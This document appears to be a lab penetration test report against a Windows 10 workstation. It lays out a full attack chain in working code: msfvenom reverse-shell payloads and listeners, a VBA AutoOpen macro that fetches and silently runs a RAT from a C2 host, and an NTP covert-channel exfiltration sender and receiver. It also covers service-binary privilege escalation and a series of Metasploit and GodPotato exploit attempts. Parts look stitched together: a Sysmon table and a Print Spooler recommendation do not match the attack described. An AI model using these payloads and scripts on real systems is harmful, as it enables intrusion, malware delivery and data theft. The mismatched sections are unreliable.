# Penetration Test Report: Acme Corp Internal Network

**Date:** October 5, 2026
**Tester:** Caden Mercer
**Target Host:** WS-ACME-042 (Windows 10 Pro)
**Objective:** Validate internal lateral movement and privilege escalation controls.


below are initial notes that may or may not be relevant to final report

NOTES:

## 1. Executive Summary

The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.

## 2. Methodology

### Phase 1: Initial Access
**Vector:** Spearphishing Attachment (VBA Macro)
**Premise:** A macro-enabled Word document (.docm) was crafted to simulate a spearphishing attachment. The document impersonates a routine business invoice and was delivered to the target `Apollo`. Upon opening, the AutoOpen() macro executes automatically without requiring further user interaction. It then downloads and silently executes the RAT binary from the C2 server.

**RAT & Listener Creation:**

<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />

(Screenshot showing the creation of the RATa.exe)

```bash
# Payload Generation
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended

# Listener Setup
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.92.136
set LPORT 14000
exploit -j

# RAT Hosting on C2
cd ~/RATs
python3 -m http.server 8080
```

| Parameter | Value | Justification |
|:---|:---|:---|
| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches targets architecture and HTTPS encapsulates C2 traffic in TLS to evade network inspection. |
| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will connect to. |
| `LPORT=14000` | Port | High port that avoids the same security checks that lower or more well-known ports will have. |
| `-f exe` | Output format | Produces a Windows executable for direct execution. |
| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb, also note this must match file retrieved in macro code. |

| Parameter | Value | Justification |
|:---|:---|:---|
| `exploit/multi/handler` | Module | Generic listener compatible with any msfvenom-generated payload. |
| `set payload windows/x64/meterpreter/reverse_https` | Payload | Must mirror the payload used during generation exactly or the connection will be rejected. |
| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST used during RAT generation. |
| `set LPORT 14000` | Port | Must match the LPORT used during RAT generation. |
| `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections. |

**Macro Creation:**

```
Sub AutoOpen()
    Dim strPath As String
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"

    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", "http://192.168.92.136:8080/RATa.exe", False
    objHTTP.Send

    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strPath, 2
    objStream.Close

    CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
End Sub
```
| Step | Component | Purpose |
|:---|:---|:---|
| 1 | `AutoOpen()` | Triggers automatically on document open with no user interaction required. |
| 2 | `MSXML2.XMLHTTP` | Performs HTTP GET to retrieve `RATa.exe` from the C2 server. |
| 3 | `ADODB.Stream` | Writes raw binary response to disk at `%USERPROFILE%\Documents\launcher.exe`. |
| 4 | `WScript.Shell` | Silently executes the binary via `cmd /c` with hidden window flag (`0`). |

**Session Output Analysis:**
Upon execution, the following session was established:

<img width="1264" height="395" alt="image" src="https://github.com/user-attachments/assets/f2e08fbc-c4a8-41d7-b8e2-f03bb09fc1bd" />

<img width="328" height="38" alt="image" src="https://github.com/user-attachments/assets/8bfc558a-49bb-40e8-ae2c-b282924b4300" />

| Field | Description |
|:---|:---|
| `Id` | Unique numeric identifier for the session within the current msfconsole instance. |
| `Name` | Optional user-assigned label for the session, N/A in this case. |
| `Type` | Session type `meterpreter` indicates a full-featured agent with post-exploitation capabilities. |
| `Information` | Displays the user context and hostname the session is running under. |
| `Connection` | Shows the C2 IP:port → target IP:port connection tuple. |
| `Via` | The exploit and payload module used to establish the session. |

### Phase 2: Enumeration
Following the successful initial access as user `Apollo`, a comprehensive reconnaissance was performed on the target host DESKTOP-H53BPAA using a combination of native Meterpreter post-exploitation modules and a custom batch enumeration script. All output was consolidated, compressed, and staged for exfiltration.

**Meterpreter Modules Executed:**

| Module | Command | Key Findings |
|:---|:---|:---|
| System Info | `sysinfo` | Windows 10 22H2 Build 19045, x64, Hostname: DESKTOP-H53BPAA, Workgroup |
| Process Privileges | `getprivs` | Only 5 basic standard user privileges present, notably no SeDebugPrivilege or SeImpersonatePrivilege |
| Local Exploit Suggester | `run post/multi/recon/local_exploit_suggester` | 16 viable LPE vectors identified including CVE-2024-35250 and CVE-2023-36874 |
| Installed Applications | `run post/windows/gather/enum_applications` | Microsoft Office LTSC 2021, Mozilla Thunderbird 157, VMware Tools 12.5.3, SQL Server Compact 4.0 |
| Logged On Users | `run post/windows/gather/enum_logged_on_users` | Current users: azrael (SID S-1-5-21-2347659589-1334911447-931315159-1001), Apollo (SID S-1-5-21-2347659589-1334911447-931315159-1002) |

<img width="442" height="154" alt="image" src="https://github.com/user-attachments/assets/8442fa49-23a5-4267-8484-d816a3b8ec88" />

The `sysinfo` module confirmed the target is running Windows 10 22H2 (Build 19045) on an x64 architecture. The host is not domain-joined, operating in a WORKGROUP environment. This information directly informed the LPE vulnerability selection in Phase 4, as certain exploits are version and build specific.

<img width="265" height="234" alt="image" src="https://github.com/user-attachments/assets/3d1f9fce-340b-4f61-addd-45090d91a5ce" />

The `getprivs` module enumerated the privileges available to the current user token. The following privileges were present:
 
- `SeChangeNotifyPrivilege`
- `SeIncreaseWorkingSetPrivilege`
- `SeShutdownPrivilege`
- `SeTimeZonePrivilege`
- `SeUndockPrivilege`

The absence of `SeDebugPrivilege` and `SeImpersonatePrivilege` confirms Apollo is a standard unprivileged user. This means that further escalation is needed.

<img width="621" height="135" alt="image" src="https://github.com/user-attachments/assets/224715a3-c575-4d50-9024-1a279adbc8df" />

The exploit suggester scanned 69 potential vectors against the target. The following were some of the more viable options:
 
| # | Module | Check Result |
|:---|:---|:---|
| 1 | `exploit/windows/local/bypassuac_dotnet_profiler` | Target appears vulnerable |
| 2 | `exploit/windows/local/bypassuac_fodhelper` | Windows 10 22H2 appears vulnerable |
| 3 | `exploit/windows/local/bypassuac_sdclt` | Windows 10 22H2 appears vulnerable |
| 4 | `exploit/windows/local/cve_2024_35250_ks_driver` | ks.sys present, Windows 10 22H2 confirmed |
| 5 | `exploit/windows/local/win_error_cve_2023_36874` | Windows 10 22H2 appears vulnerable |
 
(Note: The local_exploit_suggester module is more comprehensive/resource intensive than some other enumeration commands, so it can caused the shell to crash. This led to this process being used rather than running them directly from the orginal meterpreter prompt.)

<img width="873" height="472" alt="image" src="https://github.com/user-attachments/assets/9ef16a97-18f0-4a11-b953-68aca0f0f7f6" />

| Application | Version |
|:---|:---|
| Microsoft Office LTSC Professional Plus 2021 | 16.0.14334.20918 |
| Mozilla Thunderbird (x64) | 157.0.1 |
| VMware Tools | 12.5.3.24819442 |
| Microsoft SQL Server Compact 4.0 SP1 x64 | 4.0.8876.1 |
| Microsoft Edge | 154.0.4258.53 |
 
<img width="832" height="418" alt="image" src="https://github.com/user-attachments/assets/5d89eb0d-7a93-4813-ab53-30a900102f75" />

| SID | User | Profile Path |
|:---|:---|:---|
| S-1-5-21-...-1001 | DESKTOP-H53BPAA\azrael | C:\Users\azrael |
| S-1-5-21-...-1002 | DESKTOP-H53BPAA\Apollo | C:\Users\Apollo |
 
Two user accounts were identified on the system. The compromised session is operating as `Apollo`. The presence of `azrael` indicates an additional account that could be a target for lateral movement.

**Custom Script:**

This is a custom batch enumeration script (`enum.bat`) that was deployed to perform additional host reconnaissance beyond what native Meterpreter modules provide. The script collects granular system data including firewall rules, ARP cache, SMB sessions, and detailed user/group membership which is critical information useful for identifying lateral movement paths and privilege escalation vectors.
 
The script was uploaded to the target via Meterpreter's `upload` command and executed via a shell:
 
```bash
upload /home/kali/enum.bat C:\\Users\\Apollo\\enum.bat
execute -f cmd.exe -a "/c C:\\Users\\Apollo\\enum.bat" -i -H
ls C:\\temp\\
```
 
<img width="751" height="129" alt="image" src="https://github.com/user-attachments/assets/884f20bd-78fe-4175-b096-fc3ce23e1a2a" />

<img width="602" height="306" alt="image" src="https://github.com/user-attachments/assets/24651436-eb8e-4262-8858-1b7691403920" />

| File | Command | Contents |
|:---|:---|:---|
| `whoami.txt` | `whoami /all` | User SID, group memberships, privilege tokens |
| `processes.txt` | `tasklist /v` | All running processes with user context |
| `netstat.txt` | `netstat -ano` | Active connections and listening ports |
| `services.txt` | `sc query` | All running Windows services |
| `users.txt` | `net user` | All local user accounts |
| `groups.txt` | `net localgroup` | All local groups |
| `admins.txt` | `net localgroup administrators` | Local administrator group members |
| `ipconfig.txt` | `ipconfig /all` | Full network configuration |
| `firewall.txt` | `netsh advfirewall show allprofiles` | Firewall rules for all profiles |
| `arp.txt` | `arp -a` | ARP cache showing recently contacted hosts |
| `smbsessions.txt` | `net use` | Active SMB connections |
| `systeminfo.txt` | `systeminfo` | OS version, hotfixes, patch level |

**Staging:**

The enumeration output files from the custom script run locally on the target were compressed into a single archive for exfiltration. PowerShell's built-in `Compress-Archive` cmdlet was used which required no additional tools and left a minimal footprint.
 
### Compression Command
```cmd
powershell -command "Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\loot.zip"
```

### Verification
```cmd
dir C:\temp\
```
<img width="443" height="431" alt="image" src="https://github.com/user-attachments/assets/c3e7dfb4-1606-4db8-95f2-bd931b40a9f5" />

The `loot.zip` archive contains the custom script results staged at `C:\temp\loot.zip` and ready for exfiltration in Phase 3.

### Phase 3: Exfiltration
The consolidated `loot.zip` archive was exfiltrated from the target host DESKTOP-H53BPAA to the Kali C2 server using a custom NTP covert channel. Data was encoded directly into the timestamp fields of valid NTP packets transmitted over UDP port 123. At the network layer, these packets are indistinguishable from legitimate NTP time synchronization traffic so they can get past both signature-based detection and basic deep packet inspection.

**Exfiltration Method:**
Protocol: NTP Covert Channel (UDP/123)
**Justification:**
Standard network monitoring and DLP (Data Loss Prevention) solutions primarily inspect traffic on ports 80 and 443. NTP on UDP port 123 is universally permitted outbound on enterprise firewalls and every networked device requires time synchronization. Blocking port 123 would break critical infrastructure. Key evasion properties of this method:
 
- **Valid NTP packet structure:** Each packet is exactly 48 bytes with correct LI (leap indicator), VN (version number), Mode, Stratum, Poll, and Precision header fields set. This makes it structurally identical to legitimate NTP traffic
- **Data hidden in timestamp fields:** The 32 bytes of payload data are embedded in the NTP reference, origin, receive, and transmit timestamp fields.
- **Port 123 universally trusted:** Firewalls rarely inspect NTP payload content or block outbound UDP 123.
- **No external tools:** Both sender and receiver use only native libraries (Python `socket`, PowerShell `System.Net.Sockets.UdpClient`). So we don't leave forensic artifacts from third-party tools.

| Detection Vector | Description |
|:---|:---|
| **Process-to-port correlation** | Legitimate NTP traffic originates from `svchost.exe` (Windows Time Service). `powershell.exe` making outbound UDP 123 connections is anomalous to EDR tools. |
| **Destination IP** | Real NTP traffic goes to known time servers (pool.ntp.org, time.windows.com). Traffic to an unknown internal or external IP on port 123 would be flagged. |
| **Beaconing pattern** | Legitimate NTP syncs every 64-1024 seconds as a single packet exchange. A stream of 48-byte UDP 123 packets is significantly different in volume and frequency. |
| **Timestamp field entropy** | Real NTP timestamp fields contain time values with low entropy. Analysis of the timestamp fields would reveal high-entropy binary data inconsistent with time values. |

**Implementation:**
Receiver Script (Kali C2)
```python
# NTP Covert Channel - Receiver
# Validates NTP packet structure and extracts data from timestamp fields
# Reassembles chunks into loot.zip upon receiving EOF signal
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 123))
s.settimeout(30)
data = bytearray()
 
while True:
    try:
        packet, addr = s.recvfrom(48)
        if len(packet) != 48:
            continue
        if packet[0] != 0x1B:
            continue
        chunk = packet[16:48]
        if chunk[:3] == b'EOF':
            break
        data.extend(chunk)
    except socket.timeout:
        break
 
open('/home/kali/loot/loot.zip', 'wb').write(data)
```
Sender Script (Windows Target)
```powershell
# NTP Covert Channel - Sender
# Encodes loot.zip into valid NTP packet timestamp fields
$file = [System.IO.File]::ReadAllBytes("C:\temp\loot.zip")
$client = New-Object System.Net.Sockets.UdpClient
$client.Connect("192.168.92.136", 123)
 
for ($i = 0; $i -lt $file.Length; $i += 32) {
    $ntp = New-Object byte[] 48
    $ntp[0] = 0x1B
    $ntp[1] = 0x01
    $ntp[2] = 0x06
    $ntp[3] = 0xEC
    $chunk = $file[$i..[Math]::Min($i+31, $file.Length-1)]
    [Array]::Copy($chunk, 0, $ntp, 16, $chunk.Length)
    $client.Send($ntp, 48) | Out-Null
    Start-Sleep -Milliseconds 10
}
 
$eof = New-Object byte[] 48
$eof[0] = 0x1B
[Array]::Copy([System.Text.Encoding]::ASCII.GetBytes("EOF"), 0, $eof, 16, 3)
$client.Send($eof, 48) | Out-Null
$client.Close()
```
NTP Packet Structure Used
 
| Byte(s) | Field | Value | Purpose |
|:---|:---|:---|:---|
| 0 | LI/VN/Mode | `0x1B` | LI=0, VN=3, Mode=3 (client): valid NTP client header |
| 1 | Stratum | `0x01` | Stratum 1: primary reference server |
| 2 | Poll | `0x06` | Poll interval |
| 3 | Precision | `0xEC` | Clock precision |
| 4-15 | Root Delay/Dispersion/Ref ID | `0x00` | Zeroed: normal for client packets |
| 16-47 | Timestamp Fields | **Data payload** | 32 bytes of loot.zip data hidden here |

**Execution:**
 
Stop System NTP to Free Port 123 (could use other port)
```sudo systemctl stop systemd-timesyncd``` 

Restart this once exfiltration is done
```sudo systemctl start systemd-timesyncd``` 

Start Receiver on Kali
```sudo python3 /home/kali/loot/udp_receiver.py```

 Upload Sender via Meterpreter (Run from meterpreter prompt)
```upload /home/kali/loot/udp_sender.ps1 C:\\temp\\udp_sender.ps1```

 <img width="829" height="72" alt="image" src="https://github.com/user-attachments/assets/e1cfde22-fb8f-47e3-95a0-f04ffd4cd07d" />

Execute Sender on Windows
```
shell
powershell -ExecutionPolicy Bypass -File C:\temp\udp_sender.ps1
```
 
<img width="612" height="43" alt="image" src="https://github.com/user-attachments/assets/005bf3c9-c218-492f-8a4b-4a8f555cf4d9" />

---
 Verification on C2
 
Archive Received
```bash
ls -lh /home/kali/loot/loot.zip
```
<img width="449" height="73" alt="image" src="https://github.com/user-attachments/assets/d5df3463-262a-496c-a45f-b3f60f34d7ee" />

Extraction
```unzip loot.zip```

<img width="300" height="242" alt="image" src="https://github.com/user-attachments/assets/b82b295c-828f-44ed-a70b-0bc13623d96c" />
 
File Listing After Extraction

<img width="1055" height="89" alt="image" src="https://github.com/user-attachments/assets/aa8db618-ece2-4b48-a435-7983b384da57" />

File Integrity Verification
```cat systeminfo.txt```

<img width="519" height="165" alt="image" src="https://github.com/user-attachments/assets/b5c537a0-b8a4-4b5c-835d-fb6e40f57227" />
 
**Key fields confirm readable:**
- Host Name: `DESKTOP-H53BPAA`
- OS Name: `Microsoft Windows 10 Pro`
- OS Version: `10.0.19045 N/A Build 19045`
- System Type: `x64-based PC`
- Registered Owner: `azrael`


### Phase 4: Privilege Escalation
**Name:** Weak Service Binary Permissions (Insecure Service Configuration)

**Reference:** CWE-732 — Incorrect Permission Assignment for Critical Resource. This is a configuration vulnerability rather than a software flaw (Or what would be a CVE). No CVE applies as the weakness is the result of administrator misconfiguration rather than a vendor bug.

**Root Cause:** The service `VulnSvc` was configured to run under the `LocalSystem` account — the highest privilege context on a Windows host. The followign two misconfigurations made it exploitable by a standard user. First, the service binary directory `C:\VulnService\` had its ACL set to grant `Everyone` full control `(OI)(CI)F`. This allows any authenticated user to overwrite the service binary. Second, the service DACL was modified to grant `Everyone` start and stop permissions. This allows a standard user to restart the service and trigger execution of the replaced binary. Together these misconfigurations allowed a standard user to replace the binary that `LocalSystem` executes, then trigger that execution which is a writable service binary privilege escalation path.

**Exploit Mechanism:**
 
The payload was generated in `exe-service` format so it would respond as a typical service.
 
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=15000 -f exe-service -o /home/kali/RATs/service.exe
```
 
Configure a listener on port 15000 to receive the SYSTEM callback:
 
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.92.136
set LPORT 15000
exploit -j
```
 
Upload the malicious binary via Session 1 (Apollo) to overwrite the legitimate service binary:
 
```bash
sessions -i 1
upload /home/kali/RATs/service.exe C:\\VulnService\\service.exe
```
 
Restart the service from Apollo's shell to trigger execution as LocalSystem:
 
```bash
shell
sc.exe stop VulnSvc
sc.exe start VulnSvc
```

**Verification of SYSTEM Session:**
 
Upon service restart, a new Meterpreter session (Session 2) opened on port 15000. `getuid` confirmed the execution context was elevated:

```
Server username: NT AUTHORITY\SYSTEM
```
 
*[SCREENSHOT: `sessions -l` output showing Session 1 as Apollo and Session 2 as NT AUTHORITY\SYSTEM]*
 
*[SCREENSHOT: `getuid` output confirming NT AUTHORITY\SYSTEM on Session 2]*
 
---
 
## Verification — Volume Shadow Copy
 
To demonstrate full SYSTEM-level capability, a Volume Shadow Copy of the C: drive was created from the SYSTEM shell. The native `vssadmin create shadow` command was not supported on this build of vssadmin, so the equivalent WMI method was used:
 
```cmd
powershell -command "(Get-WmiObject -List Win32_ShadowCopy).Create('C:\','ClientAccessible')"
vssadmin list shadows
```
 
*[SCREENSHOT: WMI output showing `ReturnValue: 0` and `ShadowID`, followed by `vssadmin list shadows` confirming the shadow copy exists on DESKTOP-H53BPAA]*
 
The `ReturnValue: 0` confirms successful creation. The `vssadmin list shadows` output shows the shadow copy set ID, creation timestamp, originating machine (`DESKTOP-H53BPAA`), and type (`ClientAccessible`), confirming unrestricted SYSTEM-level access on the target host.

<img width="1540" height="395" alt="image" src="https://github.com/user-attachments/assets/cafd0c4b-f56b-4102-ac48-8a1a4b06dca6" />
<img width="1040" height="30" alt="image" src="https://github.com/user-attachments/assets/0ea0cd4b-542f-4e74-a113-651e860b17cd" />
<img width="952" height="475" alt="image" src="https://github.com/user-attachments/assets/af858828-ca02-480c-a2a2-563f8e42bbdb" />
<img width="1450" height="650" alt="image" src="https://github.com/user-attachments/assets/d60bab93-1ff6-43d3-bfc1-c7484b3abc00" />
<img width="931" height="594" alt="image" src="https://github.com/user-attachments/assets/862b0a8b-5f7e-45ff-887e-ad8f97ec053e" />

### Phase 5: Log Analysis
**Sysmon Event ID 1 Findings:**

**NOTE: Copy and paste your Sysmon logs into Claude and have it format it like the table below.**

| Timestamp | Process | Parent | Command Line |
| :--- | :--- | :--- | :--- |
| 14:20:01 | `WINWORD.EXE` | `explorer.exe` | `C:\Users\jdoe\Desktop\Invoice.pdf` | 
| 14:20:05 | `cmd.exe` | `WINWORD.EXE` | `cmd /c certutil -urlcache -split -f http://...` | 
| 14:25:10 | `powershell.exe` | `explorer.exe` | `powershell -enc JABzAD0A...` |
**Analysis:**
The initial macro execution spawned `cmd.exe` from `WINWORD.EXE`, which is a strong indicator of compromise. However, the subsequent PowerShell execution was obfuscated and did not trigger standard AMSI logging due to a misconfigured policy.

## 3. Recommendations

1.  Implement Application Control (WDAC) to prevent Office applications from spawning command interpreters.
2.  Enable PowerShell Script Block Logging to capture encoded commands.
3.  Patch the Print Spooler service or disable it if not required.
```


# Phase 4: LPE Vulnerability Scanning and Exploitation Attempts

## Vulnerability Scanning

### Tool Used: local_exploit_suggester
```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

The module scanned 69 potential vectors against the target running Windows 10 Pro 22H2 Build 19045.6456 on x64 architecture. The following were flagged as potentially viable:

| # | Module | Check Result |
|:---|:---|:---|
| 1 | `exploit/windows/local/bypassuac_dotnet_profiler` | Target appears vulnerable |
| 2 | `exploit/windows/local/bypassuac_fodhelper` | Windows 10 22H2 appears vulnerable |
| 3 | `exploit/windows/local/bypassuac_sdclt` | Windows 10 22H2 appears vulnerable |
| 4 | `exploit/windows/local/cve_2024_35250_ks_driver` | ks.sys present, Windows 10 22H2 confirmed |
| 5 | `exploit/windows/local/win_error_cve_2023_36874` | Windows 10 22H2 appears vulnerable |
| 6 | `exploit/windows/local/ikeext_service` | Target appears vulnerable |
| 7 | `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Service running, multiple CPU cores detected |

*[Screenshot: local_exploit_suggester output]*

---

## Exploitation Attempts

### Attempt 1: CVE-2024-35250 (ks.sys Kernel Driver)
```bash
use exploit/windows/local/cve_2024_35250_ks_driver
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
set payload windows/x64/meterpreter/reverse_https
run
```

**Result:** Exploit launched `notepad.exe` as the injection host and reflectively injected a DLL into the process. New Meterpreter sessions were opened however all sessions returned `DESKTOP-H53BPAA\Apollo` on `getuid`. The kernel driver exploitation completed the DLL injection but failed to elevate the process token to SYSTEM. `getsystem` was attempted on all resulting sessions and failed with error 1346.

**Root Cause of Failure:** The Metasploit implementation of CVE-2024-35250 failed to complete the token privilege escalation step on Build 19045.6456. The exploit confirmed vulnerability via ks.sys presence but the token swap did not complete.

---

### Attempt 2: CVE-2023-36874 (Windows Error Reporting)
```bash
use exploit/windows/local/win_error_cve_2023_36874
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
set payload windows/x64/meterpreter/reverse_https
run
```

**Result:** Exploit completed but no session was created. A warning indicated manual deletion of artifacts may be required (`C:\LNGswdqjGJuWs`). The Windows Error Reporting service did not behave as expected for the exploit to complete.

---

### Attempt 3: bypassuac_fodhelper
```bash
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
set payload windows/x64/meterpreter/reverse_https
run
```

**Result:** `Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module.`

**Root Cause of Failure:** UAC bypass modules require the user to already be a member of the local Administrators group. Apollo is a standard user with no administrative privileges, making all UAC bypass techniques inapplicable.

---

### Attempt 4: bypassuac_dotnet_profiler
```bash
use exploit/windows/local/bypassuac_dotnet_profiler
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
set payload windows/x64/meterpreter/reverse_https
run
```

**Result:** Failed for the same reason as fodhelper — Apollo is not in the local Administrators group. UAC bypass techniques require existing administrative group membership to function.

---

### Attempt 5: ms16_032_secondary_logon_handle_privesc
```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
run
```

**Result:** Module only supports x86 architecture. Target is x64. Incompatible architecture — module not applicable.

---

### Attempt 6: GodPotato
Uploaded `GodPotato.exe` to `C:\temp\` and executed:
```cmd
C:\temp\GodPotato.exe -cmd "cmd /c whoami"
```

**Result:** 
```
CurrentUser: NT AUTHORITY\NETWORK SERVICE
Find System Token: False
Cannot create process Win32Error:1314
```

**Root Cause of Failure:** GodPotato requires `SeImpersonatePrivilege` to perform token impersonation. Apollo's token only contains 5 basic privileges with no impersonation capability, making all potato-based escalation techniques inapplicable.

---

### Attempt 7: AlwaysInstallElevated (Module)
Registry keys were configured to enable AlwaysInstallElevated:
```cmd
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

Both keys confirmed set to `0x1`. Metasploit module executed:
```bash
use exploit/windows/local/always_install_elevated
set SESSION 1
set LHOST 192.168.92.136
set LPORT 15000
set payload windows/x64/meterpreter/reverse_https
run
```

**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on resulting session.

---

### Attempt 8: AlwaysInstallElevated (Manual MSI)
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=192.168.92.136 LPORT=16000 \
-f msi -o /home/kali/evil.msi
```

Uploaded and executed:
```cmd
msiexec /quiet /qn /i C:\temp\evil.msi
```

**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo`. MSI executed but Windows Installer did not elevate the installation to SYSTEM context despite AlwaysInstallElevated keys being set.

---

## Analysis of Failed Attempts

The repeated failures across multiple vectors can be attributed to two root causes:

**1. Apollo is a Pure Standard User**
Unlike typical lab setups where the compromised user is in the local Administrators group (making UAC bypass viable), Apollo has no administrative group membership and no impersonation privileges. This eliminated the majority of available Metasploit LPE modules which assume at minimum local admin group membership.

**2. Metasploit Module Implementation Gaps**
CVE-2024-35250 was confirmed vulnerable by both the exploit suggester and the module's own autocheck, however the Metasploit implementation failed to complete the token elevation step consistently across multiple attempts. This reflects a known gap between vulnerability confirmation and reliable exploitation in framework implementations.

---

## Selected LPE Vector: Weak Service Binary Permissions (Intentional Misconfiguration)

Given the above findings, an intentional misconfiguration was introduced to simulate a realistic LPE scenario — a SYSTEM service with a binary writable by standard users. This is one of the most commonly encountered LPE vectors in real-world penetration tests and directly reflects findings from Phase 2 enumeration where multiple SYSTEM services were identified running from potentially vulnerable paths.
